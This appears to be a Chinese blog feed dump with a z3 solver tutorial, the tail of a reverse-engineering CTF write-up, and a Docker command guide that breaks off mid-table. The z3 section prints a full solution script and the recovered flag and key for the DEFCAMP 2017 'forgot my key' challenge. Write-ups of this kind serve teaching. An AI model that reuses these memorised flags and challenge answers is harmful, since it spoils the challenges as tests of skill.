class="line">solver.add(username[<span class="number">3</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;p&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    solver.add(username[i] &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    solver.add(username[i] &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">solver.check()</span><br><span class="line">result = solver.model()</span><br><span class="line"> </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(result[username[i]].as_long().real)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>密码bump</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530001623857.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>z3约束器一把梭</title>
      <link href="//4dd2f681.html"/>
      <url>//4dd2f681.html</url>
      
        <content type="html"><![CDATA[<h2 id="项目介绍">项目介绍</h2><p>Z3 是 Microsoft Research 的定理证明器，支持位向量、布尔值、数组、浮点数、字符串和其他数据类型。</p><p>有关文档，请阅读http://z3prover.github.io/api/html/z3.html</p><h2 id="1-z3安装">1.z3安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><h2 id="2-Z3语句">2. Z3语句</h2><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220513234537818.png" alt=""></p><h2 id="3-Z3语句讲解">3. Z3语句讲解</h2><h3 id="举例">举例</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">solve(x &gt; <span class="number">2</span>, y &lt; <span class="number">10</span>, x + <span class="number">2</span>*y == <span class="number">7</span>) </span><br></pre></td></tr></table></figure><blockquote><p>上面的例子中，定义了两个变量：x 和 y。类型为 Int（注意这里的 Int 可不是 C/C++ 里面包含上下界的 int，Z3 中的 Int 对应的就是数学中的整数，Z3 中的 BitVector 才对应到 C/C++ 中的 int）。</p><p>然后就调用了 <code>solve</code> 函数求解三个条件下的满足模型，这三个条件分别是 x 大于 2，y 小于 10，并且 x 加 2y 等于 7。</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220515113651027.png" alt=""></p><blockquote><p>先定义了两个未知数x和y，类型是Z3内置的整数类型Int<br>solve() 函数会创造一个 solver，然后对括号中的<a href="https://so.csdn.net/so/search?q=%E7%BA%A6%E6%9D%9F&amp;spm=1001.2101.3001.7020">约束</a>条件进行求解，在 Z3 默认情况下只会找到满足条件的一组解。</p></blockquote><blockquote><p>可以看出，Z3 找到了 y=0，x=7 这组解。细心的小伙伴会发现，x=5,y=1 也符合条件，为什么没有体现？原因在于 Z3 在默认情况下，只寻找满足所有条件的一组解，而不是找出所有解。</p></blockquote><h2 id="4-Z3约束器使用流程">4.Z3约束器使用流程</h2><ol><li><p>创建变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例：</span><br><span class="line">x = Int(&#x27;x&#x27;) </span><br><span class="line">y = Int(&#x27;y&#x27;)</span><br></pre></td></tr></table></figure></li><li><p>创建solver求解器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例：s = Solver()</span><br></pre></td></tr></table></figure></li><li><p>添加约束条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例：s.add(x+y==10)</span><br></pre></td></tr></table></figure></li><li><p>检查solver中的约束是否满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例：s.check()</span><br></pre></td></tr></table></figure></li><li><p>利用model()输出运算结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例：s.model()</span><br></pre></td></tr></table></figure></li></ol><h2 id="5-实战演示">5.实战演示</h2><h3 id="DEFCAMP-2017-Misc-题-forgot-my-key">DEFCAMP 2017 Misc 题 forgot my key</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">题目如下：</span><br><span class="line"></span><br><span class="line">I forgot my flag &amp; key. Help me recover them.</span><br><span class="line"></span><br><span class="line">5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function my_encrypt($flag, $key) &#123;</span><br><span class="line">  $key = md5($key);</span><br><span class="line">  $message = $flag . &quot;|&quot; . $key;</span><br><span class="line"></span><br><span class="line">  $encrypted = chr(rand(0, 126));</span><br><span class="line">  for($i=0;$i&lt;strlen($message);$i++) &#123;</span><br><span class="line">    $encrypted .= chr((ord($message[$i]) + ord($key[$i % strlen($key)]) + ord($encrypted[$i])) % 126);</span><br><span class="line">  &#125;</span><br><span class="line">  $hexstr = unpack(&#x27;h*&#x27;, $encrypted);</span><br><span class="line">  return array_shift($hexstr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题给了一个加密函数，要求还原 flag 和 key。观察可以发现，加密串每一位都与明文、key、和加密串的前一位相关。但是由于第一位是随机出来的，所以很难从开头递推出来。但是细心观察 message 的构成又可以发现，后面 32 位是 key 的 md5 串，倒数第 33 位又是已知，因此从这里就可以打开突破口。整理思路如下：</p><ul><li>第一步：通过倒数第 33 位明文已知，且密文已知，因此可以求得某一位 md5($key) 的值。</li><li>第二步：根据上一步推出来的值，又可以进一步推另一位 message 的值。如此往复下去，最终应该能找到所有的值。</li></ul><p>思路是有了，然而写起来未必简单，因为人的思维都是正向的，逆向求解特别是还要写出完整求解代码总是麻烦的。</p><p>于是我们考虑是否可以使用 Z3 来求解。首先题目肯定保证了答案的唯一性，因此 Z3 求解成功就会得到 flag 无疑。其次，我们根据题目的变换方式，给 Z3 所有的正推关系式，把逆推的逻辑让 Z3 通过约束求解来完成，由于逆推可以一步步进行，因此也不会导致 Z3 复杂度爆炸求解不出来。如此分析应该 Z3 一把梭问题不大。</p><h3 id="代码如下：">代码如下：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&#x27;</span></span><br><span class="line"></span><br><span class="line">encrypted = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    encrypted.append(binascii.unhexlify(s[i+<span class="number">1</span>] + s[i])[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;message len:&#x27;</span>, <span class="built_in">len</span>(encrypted)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(encrypted)</span><br><span class="line"><span class="comment"># 声明变量，encrypted 是已知，因此 IntVal 即可</span></span><br><span class="line">encrypted = [IntVal(i) <span class="keyword">for</span> i <span class="keyword">in</span> encrypted]</span><br><span class="line">message = [Int(<span class="string">&#x27;flag%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)-<span class="number">1</span>)]</span><br><span class="line"><span class="comment"># 创建一个求解器，求解全靠它</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">ml = <span class="built_in">len</span>(encrypted) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加明文字符的约束条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">    <span class="keyword">if</span> i == ml - <span class="number">33</span>:</span><br><span class="line">        solver.add(message[i] == <span class="built_in">ord</span>(<span class="string">&#x27;|&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 肯定是可见字符，因此限定范围如下</span></span><br><span class="line">        solver.add(message[i] &lt; <span class="number">127</span>)</span><br><span class="line">        solver.add(message[i] &gt;= <span class="number">32</span>)</span><br><span class="line"><span class="comment"># 添加明文和密文对照关系的约束条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">    solver.add(encrypted[i+<span class="number">1</span>] == (message[i] + message[ml-<span class="number">32</span>+i%<span class="number">32</span>] + encrypted[i]) % <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    s = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">        s.append(m[message[i]].as_long())</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;unsat&#x27;</span>) </span><br></pre></td></tr></table></figure><h3 id="运行结果">运行结果</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220515114431571.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">message len: 103</span><br><span class="line">[101, 97, 95, 105, 98, 71, 45, 118, 20, 45, 24, 96, 0, 106, 92, 70, 103, 2, 76, 62, 45, 120, 16, 119, 15, 121, 97, 43, 115, 9, 33, 60, 36, 61, 91, 72, 92, 118, 18, 89, 109, 53, 39, 66, 52, 31, 60, 41, 69, 99, 0, 112, 16, 48, 24, 123, 18, 124, 20, 90, 35, 11, 83, 64, 45, 72, 57, 40, 61, 87, 12, 109, 8, 38, 21, 42, 73, 54, 83, 106, 55, 86, 32, 16, 0, 31, 6, 31, 103, 4, 108, 10, 85, 56, 79, 105, 84, 61, 91, 117, 88, 38, 18, 43]</span><br><span class="line">b&#x27;DCTF&#123;0d940de38493d96dc6255cbb2c2ac7a2db1a7792c74859e95215caa6b57c69b2&#125;|6941f4cac9b7784fdd77e11b51cd0d64&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="//f255ffad.html"/>
      <url>//f255ffad.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo    </span><br></pre></td></tr></table></figure><h2 id="Docker常见命令">Docker常见命令</h2><h3 id="帮助命令">帮助命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version #显示docker的版本信息</span><br><span class="line">docker info #显示docker的系统信息，包括镜像和容器的数量</span><br><span class="line">docker --help</span><br></pre></td></tr></table></figure><p>命令文档地址https://docs.docker.com/engine/reference/run/</p><h3 id="镜像命令">镜像命令</h3><h4 id="docker-images-命令"><strong>docker images 命令</strong></h4><blockquote><p>查看所有本地主机上的镜像</p></blockquote><p>[root@VM-16-9-centos ~]# docker images<br>REPOSITORY    TAG       IMAGE ID       CREATED        SIZE<br>hello-world   latest    feb5d9fea6a5   7 months ago   13.3kB</p><p>解释：</p><p>REPOSITORY 镜像的仓库源</p><p>TAG  镜像的标签</p><p>IMAGE ID 镜像的ID</p><p>CREATED 镜像的创建时间</p><p>SIZE 镜像的大小</p><h4 id="docker-images-命令大全">docker images 命令大全</h4><table><thead><tr><th>名称，简写</th><th>默认</th><th>描述</th></tr></thead><tbody><tr><td><code>--all</code>,<code>-a</code></td><td></td><td>显示所有图像（默认隐藏中间图像）</td></tr><tr><td><code>--digests</code></td><td></td><td>显示摘要</td></tr><tr><td><code>--filter</code>,<code>-f</code></td><td></td><td>根据提供的条件过滤输出</td></tr><tr><td><code>--format</code></td><td></td><td>使用 Go 模板打印漂亮的图像</td></tr><tr><td><code>--no-trunc</code></td><td></td><td>不要截断输出</td></tr><tr><td><code>--quiet</code>,<code>-q</code></td><td></td><td>仅显示图像 ID</td></tr></tbody></table><p><strong>docker search 搜索仓库里的镜像</strong></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220507204952102.png" alt="和官网差不多"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search mysql --filter=STARS=3000</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220507204841888.png" alt="加限制条件"></p><h4 id="docker-pull-命令"><strong>docker pull 命令</strong></h4><blockquote><p>下载镜像</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-9-centos ~]# docker pull mysql</span><br><span class="line">Using default tag: latest #如果不写tag，默认就是latest</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Pull complete #分层下载，docker images的核心 联合文件系统</span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709 #签名（防伪）</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest #真实地址</span><br></pre></td></tr></table></figure><p>这两个命名是等价的</p><p><strong>docker pull mysql</strong></p><p><strong>docker pull <a href="http://docker.io/library/mysql:latest">docker.io/library/mysql:latest</a></strong></p><p>指定版本下载</p><p><strong>docker pull mysql:5.7</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-9-centos ~]# docker pull mysql:5.7 #使用tag指定版本下载</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Already exists </span><br><span class="line">93619dbc5b36: Already exists </span><br><span class="line">99da31dd6142: Already exists </span><br><span class="line">626033c43d70: Already exists </span><br><span class="line">37d5d7efb64e: Already exists </span><br><span class="line">ac563158d721: Already exists </span><br><span class="line">d2ba16033dad: Already exists </span><br><span class="line">0ceb82207cd7: Pull complete </span><br><span class="line">37f2405cae96: Pull complete </span><br><span class="line">e2482e017e53: Pull complete </span><br><span class="line">70deed891d42: Pull complete </span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure><h4 id="docker-rmi-命令"><strong>docker rmi 命令</strong></h4><blockquote><p>删除镜像</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-9-centos ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">mysql         5.7       c20987f18b13   4 months ago   448MB</span><br><span class="line">mysql         latest    3218b38490ce   4 months ago   516MB</span><br><span class="line">hello-world   latest    feb5d9fea6a5   7 months ago   13.3kB</span><br><span class="line">[root@VM-16-9-centos ~]# docker rmi -f c20987f18b13</span><br><span class="line">Untagged: mysql:5.7</span><br><span class="line">Untagged: mysql@sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Deleted: sha256:c20987f18b130f9d144c9828df630417e2a9523148930dc3963e9d0dab302a76</span><br><span class="line">Deleted: sha256:6567396b065ee734fb2dbb80c8923324a778426dfd01969f091f1ab2d52c7989</span><br><span class="line">Deleted: sha256:0910f12649d514b471f1583a16f672ab67e3d29d9833a15dc2df50dd5536e40f</span><br><span class="line">Deleted: sha256:6682af2fb40555c448b84711c7302d0f86fc716bbe9c7dc7dbd739ef9d757150</span><br><span class="line">Deleted: sha256:5c062c3ac20f576d24454e74781511a5f96739f289edaadf2de934d06e910b92</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>docker rmi -f 容器id #删除指定的容器</p><p>docker rmi -f 容器id 容器id 容器id 容器id #删除多个容器</p><p>docker rmi -f $(docker images -aq) #删除全部的容器</p><h3 id="容器命令">容器命令</h3><blockquote><p>说明：我们有了镜像才可以创建容器，Linux，下载一个centos镜像来测试学习</p></blockquote><p>下载镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure><p><strong>新建容器并启动</strong></p><h4 id="docker-run-可选参数-image">docker run [可选参数] image</h4><p>可选参数说明</p><p>–name=“name” 容器名字 XXX1 XXX2，用来区分容器</p><p>-d 后台方式运行</p><p>-it 使用交互方式运行，进入容器查看内容</p><p>-p 指定容器端口 -p 8080:8080</p><ul><li>-p ip:主机端口：容器端口</li><li>-p 主机端口：容器端口（常用）</li><li>-p 容器端口</li><li>容器端口</li></ul><p>-p 随机指定端口</p><p>比如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it centos /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220507234528676.png" alt=""></p><p>退出</p><p>exit 停止运行并退出</p><p>或者ctrl + p + q 不停止运行退出</p><h4 id="docker-run-命令大全">docker run 命令大全</h4><table><thead><tr><th>名称，简写</th><th>默认</th><th>描述</th></tr></thead><tbody><tr><td><code>--add-host</code></td><td></td><td>添加自定义主机到 IP 映射 (host:ip)</td></tr><tr><td><code>--attach</code>,<code>-a</code></td><td></td><td>连接到 STDIN、STDOUT 或 STDERR</td></tr><tr><td><code>--blkio-weight</code></td><td></td><td>块 IO（相对权重），介于 10 和 1000 之间，或 0 禁用（默认 0）</td></tr><tr><td><code>--blkio-weight-device</code></td><td></td><td>块 IO 权重（相对设备权重）</td></tr><tr><td><code>--cap-add</code></td><td></td><td>添加 Linux 功能</td></tr><tr><td><code>--cap-drop</code></td><td></td><td>放弃 Linux 功能</td></tr><tr><td><code>--cgroup-parent</code></td><td></td><td>容器的可选父 cgroup</td></tr><tr><td><code>--cgroupns</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.41/"><strong>API 1.41+</strong></a> cgroup namespace to use (host|private) ‘host’：在 Docker 主机的 cgroup 命名空间中运行容器 ‘private’：在它自己的私有 cgroup 命名空间中运行容器 ‘’：使用由 default-cgroupns- 配置的 cgroup 命名空间守护程序上的模式选项（默认）</td></tr><tr><td><code>--cidfile</code></td><td></td><td>将容器 ID 写入文件</td></tr><tr><td><code>--cpu-count</code></td><td></td><td>CPU 计数（仅限 Windows）</td></tr><tr><td><code>--cpu-percent</code></td><td></td><td>CPU 百分比（仅限 Windows）</td></tr><tr><td><code>--cpu-period</code></td><td></td><td>限制 CPU CFS（完全公平调度器）周期</td></tr><tr><td><code>--cpu-quota</code></td><td></td><td>限制 CPU CFS（完全公平调度器）配额</td></tr><tr><td><code>--cpu-rt-period</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.25/"><strong>API 1.25+</strong></a> 以微秒为单位限制 CPU 实时周期</td></tr><tr><td><code>--cpu-rt-runtime</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.25/"><strong>API 1.25+</strong></a> 以微秒为单位限制 CPU 实时运行时间</td></tr><tr><td><code>--cpu-shares</code>,<code>-c</code></td><td></td><td>CPU 份额（相对权重）</td></tr><tr><td><code>--cpus</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.25/"><strong>API 1.25+</strong></a> CPU 数量</td></tr><tr><td><code>--cpuset-cpus</code></td><td></td><td>允许执行的 CPU (0-3, 0,1)</td></tr><tr><td><code>--cpuset-mems</code></td><td></td><td>允许执行的 MEM (0-3, 0,1)</td></tr><tr><td><code>--detach</code>,<code>-d</code></td><td></td><td>在后台运行容器并打印容器 ID</td></tr><tr><td><code>--detach-keys</code></td><td></td><td>覆盖用于分离容器的键序列</td></tr><tr><td><code>--device</code></td><td></td><td>将主机设备添加到容器</td></tr><tr><td><code>--device-cgroup-rule</code></td><td></td><td>将规则添加到 cgroup 允许的设备列表</td></tr><tr><td><code>--device-read-bps</code></td><td></td><td>限制设备的读取速率（每秒字节数）</td></tr><tr><td><code>--device-read-iops</code></td><td></td><td>限制设备的读取速率（每秒 IO）</td></tr><tr><td><code>--device-write-bps</code></td><td></td><td>限制设备的写入速率（每秒字节数）</td></tr><tr><td><code>--device-write-iops</code></td><td></td><td>限制设备的写入速率（每秒 IO）</td></tr><tr><td><code>--disable-content-trust</code></td><td><code>true</code></td><td>跳过图像验证</td></tr><tr><td><code>--dns</code></td><td></td><td>设置自定义 DNS 服务器</td></tr><tr><td><code>--dns-opt</code></td><td></td><td>设置 DNS 选项</td></tr><tr><td><code>--dns-option</code></td><td></td><td>设置 DNS 选项</td></tr><tr><td><code>--dns-search</code></td><td></td><td>设置自定义 DNS 搜索域</td></tr><tr><td><code>--domainname</code></td><td></td><td>容器 NIS 域名</td></tr><tr><td><code>--entrypoint</code></td><td></td><td>覆盖图像的默认入口点</td></tr><tr><td><code>--env</code>,<code>-e</code></td><td></td><td>设置环境变量</td></tr><tr><td><code>--env-file</code></td><td></td><td>读入环境变量文件</td></tr><tr><td><code>--expose</code></td><td></td><td>公开一个端口或一系列端口</td></tr><tr><td><code>--gpus</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.40/"><strong>API 1.40+</strong></a> 要添加到容器中的 GPU 设备（“全部”以传递所有 GPU）</td></tr><tr><td><code>--group-add</code></td><td></td><td>添加其他组以加入</td></tr><tr><td><code>--health-cmd</code></td><td></td><td>运行以检查运行状况的命令</td></tr><tr><td><code>--health-interval</code></td><td></td><td>运行检查之间的时间 (ms|s|m|h) (默认 0s)</td></tr><tr><td><code>--health-retries</code></td><td></td><td>需要报告不健康的连续失败</td></tr><tr><td><code>--health-start-period</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.29/"><strong>API 1.29+</strong></a> 开始健康重试倒计时之前容器初始化的开始时间（ms|s|m|h）（默认 0s）</td></tr><tr><td><code>--health-timeout</code></td><td></td><td>允许运行一项检查的最长时间 (ms|s|m|h) (默认 0s)</td></tr><tr><td><code>--help</code></td><td></td><td>打印使用</td></tr><tr><td><code>--hostname</code>,<code>-h</code></td><td></td><td>容器主机名</td></tr><tr><td><code>--init</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.25/"><strong>API 1.25+</strong></a> 在容器内运行一个 init 来转发信号并收获进程</td></tr><tr><td><code>--interactive</code>,<code>-i</code></td><td></td><td>即使没有连接，也保持 STDIN 打开</td></tr><tr><td><code>--io-maxbandwidth</code></td><td></td><td>系统驱动器的最大 IO 带宽限制（仅限 Windows）</td></tr><tr><td><code>--io-maxiops</code></td><td></td><td>系统驱动器的最大 IOps 限制（仅限 Windows）</td></tr><tr><td><code>--ip</code></td><td></td><td>IPv4 地址（例如，172.30.100.104）</td></tr><tr><td><code>--ip6</code></td><td></td><td>IPv6 地址（例如，2001:db8::33）</td></tr><tr><td><code>--ipc</code></td><td></td><td>要使用的 IPC 模式</td></tr><tr><td><code>--isolation</code></td><td></td><td>容器隔离技术</td></tr><tr><td><code>--kernel-memory</code></td><td></td><td>内核内存限制</td></tr><tr><td><code>--label</code>,<code>-l</code></td><td></td><td>在容器上设置元数据</td></tr><tr><td><code>--label-file</code></td><td></td><td>读入以行分隔的标签文件</td></tr><tr><td><code>--link</code></td><td></td><td>添加到另一个容器的链接</td></tr><tr><td><code>--link-local-ip</code></td><td></td><td>容器 IPv4/IPv6 链路本地地址</td></tr><tr><td><code>--log-driver</code></td><td></td><td>容器的日志记录驱动程序</td></tr><tr><td><code>--log-opt</code></td><td></td><td>日志驱动程序选项</td></tr><tr><td><code>--mac-address</code></td><td></td><td>容器 MAC 地址（例如，92:d0:c6:0a:29:33）</td></tr><tr><td><code>--memory</code>,<code>-m</code></td><td></td><td>内存限制</td></tr><tr><td><code>--memory-reservation</code></td><td></td><td>内存软限制</td></tr><tr><td><code>--memory-swap</code></td><td></td><td>交换限制等于内存加上交换：‘-1’ 启用无限交换</td></tr><tr><td><code>--memory-swappiness</code></td><td><code>-1</code></td><td>调整容器内存交换（0 到 100）</td></tr><tr><td><code>--mount</code></td><td></td><td>将文件系统挂载附加到容器</td></tr><tr><td><code>--name</code></td><td></td><td>为容器分配名称</td></tr><tr><td><code>--net</code></td><td></td><td>将容器连接到网络</td></tr><tr><td><code>--net-alias</code></td><td></td><td>为容器添加网络范围的别名</td></tr><tr><td><code>--network</code></td><td></td><td>将容器连接到网络</td></tr><tr><td><code>--network-alias</code></td><td></td><td>为容器添加网络范围的别名</td></tr><tr><td><code>--no-healthcheck</code></td><td></td><td>禁用任何容器指定的 HEALTHCHECK</td></tr><tr><td><code>--oom-kill-disable</code></td><td></td><td>禁用 OOM 